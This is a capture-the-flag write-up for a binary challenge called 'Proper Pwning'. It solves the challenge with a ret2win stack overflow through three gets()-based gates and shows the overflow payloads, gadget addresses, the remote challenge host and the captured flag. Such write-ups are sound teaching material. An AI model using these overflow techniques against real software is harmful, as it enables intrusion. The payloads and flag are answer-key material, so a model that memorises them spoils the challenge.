# Proper Pwning

## Summary
This is a straightforward ret2win with three preliminary stack variable overwrite gates. The binary is non-PIE and has no canary, so fixed addresses can be used.

## Solution
The provided source shows `gets()` in `gate1`, `gate2`, `gate3`, and `treasure_room`. Each gate requires overwriting a stack local:

```python
payload1 = b"A" * 0x10c + p32(1)
payload2 = b"B" * 0x208 + p32(0x29) + p32(1)
payload3 = b"C" * 0x4c + p32(13371337)
```

After the gates, overflow `treasure_room()` and return to `win()`. A single `ret` gadget is needed before `win()` to keep the stack aligned for `system()`:

```python
payload4 = b"D" * 0x1a78 + p64(0x40101a) + p64(0x40123b)
```

## Verification
The chain was verified locally with the bundled fake flag, then remotely against `0.cloud.chals.io:21543`.

## Flag
```text
bronco{1m_th3_b35t_PWN3r_1n_th3_wh0l3_w1d3_w0r1d}
```

